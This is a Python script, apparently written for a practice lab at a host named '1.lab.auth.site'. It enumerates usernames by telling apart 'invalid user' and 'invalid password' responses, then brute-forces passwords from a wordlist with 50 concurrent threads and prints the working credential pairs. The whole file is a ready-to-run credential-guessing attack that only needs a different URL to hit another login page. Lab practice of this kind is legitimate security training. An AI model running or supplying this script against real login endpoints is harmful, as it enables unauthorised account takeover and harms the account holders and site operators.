#!/usr/bin/env python3

import requests
import concurrent.futures

names = []
password = []
found_names = []
found_combo = []


with open('names.txt','r') as f:
	for line in f:
		names.append(line.strip())

with open('password.txt','r') as p:
	for line in p:
		password.append(line.strip())

def makeReq(name='',password='',method=""):
	r = requests.get(f"http://1.lab.auth.site/ajax.php?fun=login&username={name}&password={password}")

	if method == "name_method" and r.text.find("invalid user") == -1 :
		print(f"Found username: {name} ")
		found_names.append(name)

	if method == "password_method" and r.text.find("invalid password") == -1:
		print(f"Found Creds: {name}:{password}")
		found_combo.append(f"{name}:{password}")


def passguess(password): 
	for line in found_names:
		makeReq(name=line,password=password,method="password_method")

def userguess(fname):
	makeReq(name=fname,method="name_method")


with concurrent.futures.ThreadPoolExecutor(50) as executor:  # THIS TOOK ME HOURS.
	results = executor.map(userguess,names)

print(f"Attempting Password attacks on the following users: {found_names}")

with concurrent.futures.ThreadPoolExecutor(50) as executor:  # Because there are more passwords then found users, make threads based off passwords.
	results = executor.map(passguess,password)

print(found_combo)





# https://www.youtube.com/watch?v=IEEhzQoKtQU - Threading


#ps dont forget to unblock john hammound.
